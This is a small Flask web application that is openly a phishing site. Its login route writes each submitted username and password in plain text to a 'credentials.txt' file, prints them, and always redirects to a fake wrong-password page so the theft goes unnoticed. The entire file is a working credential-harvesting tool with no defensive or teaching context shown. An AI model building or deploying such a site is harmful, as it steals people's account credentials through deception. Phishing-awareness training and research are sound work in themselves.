from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)
filename = '/var/www/phishing_site/resources/credentials.txt'

@app.route('/')
def home():
	return render_template('home.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
	if request.method == 'POST':
		username = request.form['username']
		password = request.form['password']
		with open(filename, 'a') as file:
			file.write(username + ',' + password + '\n')  # Write the username followed by a newline
		
		print(f'Username: {username}, Password: {password}')
		#always route to wrong password
		return redirect(url_for('wrong_password'))  
	return render_template('login.html')

@app.route('/wrong_password')
def wrong_password():
    return render_template('wrong_password.html')


if __name__ == '__main__':
	app.run(debug=True)
